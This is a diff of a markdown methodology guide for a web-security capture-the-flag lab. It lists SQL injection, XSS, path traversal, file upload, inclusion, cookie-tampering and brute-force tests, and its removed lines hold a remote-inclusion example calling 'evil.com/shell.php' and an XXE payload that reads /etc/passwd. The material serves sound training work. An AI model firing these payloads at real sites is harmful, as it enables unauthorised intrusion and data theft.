@@ -5,210 +5,275 @@
 ### Phase 1: Information Gathering
 
 1. **Browse the entire website**
-   - Click through all pages
+
+   - Click through all pages and links
    - Note all URLs and parameters
    - Check for hidden links in source code
    - Look for comments in HTML/JavaScript
 
 2. **Check common files**
-   - `/robots.txt` - May reveal hidden directories
+
+   - `/robots.txt` - May reveal hidden directories (e.g., `/.hidden`, `/whatever`)
    - `/.git/` - May expose source code
    - `/.env` - May contain credentials
    - `/backup/`, `/old/`, `/test/` - Common backup directories
    - `/phpinfo.php` - May reveal system information
 
 3. **Inspect HTTP headers**
+
    - Use browser DevTools Network tab
    - Look for server information, cookies, tokens
    - Check for security headers (or lack thereof)
+   - Examine cookies for sensitive data (e.g., `I_am_admin`)
+
+4. **Source code inspection**
+   - View page source (Ctrl+U / Cmd+Option+U)
+   - Check for hidden form fields
+   - Look for client-side validation
+   - Search for comments containing hints
 
 ### Phase 2: Input Testing
 
-For each input field, test:
+For each input field, test systematically:
 
-#### SQL Injection Payloads
-```
-' OR '1'='1
-' OR '1'='1'--
-' OR '1'='1'/*
-admin'--
-admin'/*
-' UNION SELECT NULL--
-' UNION SELECT NULL,NULL--
-' UNION SELECT NULL,NULL,NULL--
-```
+#### SQL Injection Testing
 
-#### XSS Payloads
-```
-<script>alert('XSS')</script>
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-"><script>alert('XSS')</script>
-javascript:alert('XSS')
-```
+1. **Basic tests** - Start with simple payloads:
 
-#### Command Injection Payloads
-```
-; ls
-| cat /etc/passwd
-$(whoami)
-`id`
-; cat /etc/passwd
-```
+   ```
+   '
+   ''
+   ' OR '1
+   ' OR '1'='1
+   ' OR '1'='1'--
+   ```
 
-#### Path Traversal Payloads
-```
-../../etc/passwd
-....//....//etc/passwd
-..%2F..%2Fetc%2Fpasswd
-%2e%2e%2f%2e%2e%2fetc%2fpasswd
-```
+2. **Union-based** - If basic tests work, enumerate columns:
+
+   ```
+   ' UNION SELECT NULL--
+   ' UNION SELECT NULL,NULL--
+   ' UNION SELECT NULL,NULL,NULL--
+   ' UNION SELECT 1,2,3--
+   ```
+
+3. **Extract data** - Once column count is known:
+
+   ```
+   ' UNION SELECT table_name, 1 FROM information_schema.tables--
+   ' UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name=0x7573657273--
+   ' UNION SELECT Commentaire, countersign FROM users--
+   ```
+
+4. **Bypass filters** - Use hex encoding for strings:
+   ```
+   0x7573657273  (hex for "users")
+   0x6c6973745f696d61676573  (hex for "list_images")
+   ```
+
+#### XSS Testing
+
+1. **Reflected XSS** - Test URL parameters and search fields:
+
+   ```
+   <script>alert('XSS')</script>
+   <img src=x onerror=alert(1)>
+   <svg onload=alert(1)>
+   ```
+
+2. **Stored XSS** - Test comment sections, guestbooks:
+
+   ```
+   <script>alert('XSS')</script>
+   <img src=x onerror=alert('XSS')>
+   ```
+
+3. **Data URI bypass** - For media/file inclusion:
+   ```
+   data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+   ```
+
+#### Path Traversal Testing
+
+1. **Basic traversal**:
+
+   ```
+   ../../etc/passwd
+   ....//....//etc/passwd
+   ..%2F..%2Fetc%2Fpasswd
+   ```
+
+2. **URL encoded**:
+   ```
+   %2e%2e%2f%2e%2e%2fetc%2fpasswd
+   ..%252F..%252Fetc%252Fpasswd
+   ```
 
 ### Phase 3: Authentication Testing
 
-1. **Default credentials**
-   - admin/admin
-   - admin/password
-   - admin/123456
-   - root/root
-   - guest/guest
+1. **Cookie manipulation**
 
-2. **SQL Injection in login**
-   - `admin'--`
-   - `admin' OR '1'='1'--`
-   - `' OR '1'='1'--`
+   - Inspect cookies in DevTools
+   - Look for hashed values (MD5, SHA)
+   - Decrypt hashes using [CrackStation](https://crackstation.net/)
+   - Modify cookie values (e.g., `I_am_admin`)
 
-3. **Bypass authentication**
-   - Direct URL access to protected pages
-   - Manipulate session cookies
-   - Check for weak session tokens
+2. **Default credentials**
+
+   - Try: `admin/admin`, `admin/password`, `root/root`
+   - Check for exposed credential files (`.htpasswd`)
+
+3. **SQL Injection in login**
+
+   ```
+   admin'--
+   admin' OR '1'='1'--
+   ' OR '1'='1'--
+   ```
+
+4. **Brute force**
+
+   - Use wordlists (e.g., `10k-most-common.txt`)
+   - Check for rate limiting
+   - Automate with scripts
+
+5. **Header manipulation**
+   - Test `User-Agent` header
+   - Test `Referer` header
+   - Modify headers to bypass checks
 
 ### Phase 4: File Operations
 
 1. **File Upload**
+
    - Try uploading PHP files: `<?php phpinfo(); ?>`
-   - Try different extensions: `.php`, `.phtml`, `.php3`, `.php4`, `.php5`
-   - Try double extensions: `file.php.jpg`
-   - Try null bytes: `file.php%00.jpg`
+   - Try different extensions: `.php`, `.phtml`, `.php3`
+   - Try MIME type manipulation
+   - Check for path traversal in filenames
 
 2. **File Inclusion**
    - Test parameters like `?page=`, `?file=`, `?include=`
-   - Try LFI: `?page=../../etc/passwd`
-   - Try RFI: `?page=http://evil.com/shell.php`
+   - Try: `?page=../../etc/passwd`
+   - Test with null bytes: `?page=../../etc/passwd%00`
 
-3. **File Download**
-   - Check for direct file access
-   - Test path traversal in download URLs
+### Phase 5: Hidden Data Discovery
 
-### Phase 5: Session Management
+1. **Hidden form fields**
 
-1. **Session fixation**
-   - Set a session ID and see if it's accepted
-   - Check if session tokens are predictable
+   - View page source
+   - Use browser DevTools to inspect forms
+   - Look for `<input type="hidden">` fields
 
-2. **Session hijacking**
-   - Check if session tokens are transmitted securely
-   - Look for session tokens in URLs
+2. **Directory listing**
 
-### Phase 6: Access Control
+   - Check if directories show file listings
+   - Use `wget` or custom crawlers for recursive discovery
+   - Filter results to find unique content
 
-1. **IDOR (Insecure Direct Object References)**
-   - Change user IDs in URLs: `?id=1` → `?id=2`
-   - Change account numbers
-   - Access other users' profiles/data
+3. **Sensitive files**
+   - Check `robots.txt` for disallowed paths
+   - Look for `.htpasswd`, `.env`, backup files
+   - Check for exposed configuration files
 
-2. **Missing Access Control**
-   - Try accessing admin pages directly
-   - Test horizontal privilege escalation
-   - Test vertical privilege escalation
+### Phase 6: Redirect Testing
 
-### Phase 7: CSRF Testing
+1. **Open redirect**
 
-1. **Check for CSRF tokens**
-   - Look for hidden CSRF token fields
-   - Check if tokens are validated
+   - Test redirect parameters: `?page=redirect&site=XXX`
+   - Try external URLs
+   - Check if validation exists
 
-2. **Test CSRF**
-   - Create a malicious HTML page that submits forms
-   - Test if actions can be performed without proper tokens
+2. **Unvalidated redirects**
+   - Modify redirect destinations
+   - Test with different protocols
 
-### Phase 8: Other Vulnerabilities
+## Testing Workflow
 
-1. **XXE (XML External Entity)**
-   - If XML parsing exists, try:
-   ```xml
-   <?xml version="1.0"?>
-   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-   <foo>&xxe;</foo>
-   ```
+### For Each Page:
 
-2. **SSRF (Server-Side Request Forgery)**
-   - If URL fetching exists, try:
-   - `http://127.0.0.1:22` (SSH)
-   - `http://127.0.0.1:3306` (MySQL)
-   - `file:///etc/passwd`
+1. **Map the functionality**
 
-3. **Security Misconfiguration**
-   - Check for exposed files
-   - Check for default credentials
-   - Check for verbose error messages
+   - What does this page do?
+   - What inputs does it accept?
+   - What outputs does it produce?
 
-## Browser DevTools Tips
+2. **Identify input points**
 
-### Network Tab
-- Inspect all requests and responses
-- Look for sensitive data in responses
-- Check for authentication tokens
-- Monitor cookie behavior
+   - URL parameters (`?id=1`, `?page=signin`)
+   - Form fields (username, password, search)
+   - Headers (User-Agent, Referer, Cookies)
+   - File uploads
 
-### Console Tab
-- Check for JavaScript errors
-- Look for exposed API keys
-- Test DOM-based XSS
+3. **Test systematically**
 
-### Application/Storage Tab
-- Check cookies, localStorage, sessionStorage
-- Look for sensitive data stored client-side
+   - Start with basic payloads
+   - Escalate if initial tests succeed
+   - Document all findings
 
-### Sources Tab
-- View JavaScript files
-- Look for hardcoded credentials
-- Check for client-side validation only
+4. **Verify results**
+   - Check if flag appears
+   - Confirm vulnerability exists
+   - Capture proof (screenshots, responses)
 
-## Common Flag Locations
+## Tools and Techniques
 
-Flags might be found in:
-- Database (via SQL injection)
-- File system (via LFI/RFI)
-- Environment variables
-- Source code comments
-- Hidden directories
-- Admin panels
-- After exploiting any vulnerability
+### Browser DevTools
 
-## Documentation Template
+- **Elements** - Inspect HTML, find hidden fields
+- **Network** - Monitor requests/responses, check headers
+- **Application/Storage** - View cookies, local storage
+- **Console** - Execute JavaScript, test XSS
 
-For each breach, document:
+### Command Line Tools
 
-1. **Discovery**
-   - What page/feature were you testing?
-   - What made you suspect a vulnerability?
+- **curl** - Make HTTP requests, test endpoints
+- **wget** - Recursive web crawling
+- **grep** - Search for patterns in responses
+- **md5/sha256** - Generate hashes
 
-2. **Exploitation**
-   - Step-by-step process
-   - Payloads used
-   - Tools used (if any)
+### Custom Scripts
 
-3. **Proof**
-   - Screenshots
-   - Request/response captures
-   - Command outputs
+- **scraper.sh** - Recursive directory crawler
+- **bruteforce_login.sh** - Password brute force automation
 
-4. **Impact**
-   - What can an attacker do?
-   - What data can be accessed?
+## Common Patterns
 
-5. **Fix**
-   - How should this be fixed?
-   - What security measures should be implemented?
+### Finding Flags
 
+Flags are typically:
+
+- 64-character hexadecimal strings
+- Hidden in:
+  - Database query results
+  - HTML comments
+  - Response headers
+  - File contents
+  - Cookie values (after manipulation)
+
+### Error Messages
+
+Look for:
+
+- Database errors (reveal SQL structure)
+- File system errors (reveal paths)
+- PHP errors (reveal code structure)
+- Stack traces (reveal internal logic)
+
+### Success Indicators
+
+- Different page content
+- Redirects to new pages
+- Flags in response
+- Altered functionality
+- New cookies or headers
+
+## Documentation
+
+For each vulnerability found:
+
+1. Document how you discovered it
+2. Explain the exploitation steps
+3. Capture proof (flag, screenshots)
+4. Explain how to fix it
+
+Save everything in the breach folder's `Resources/` directory.
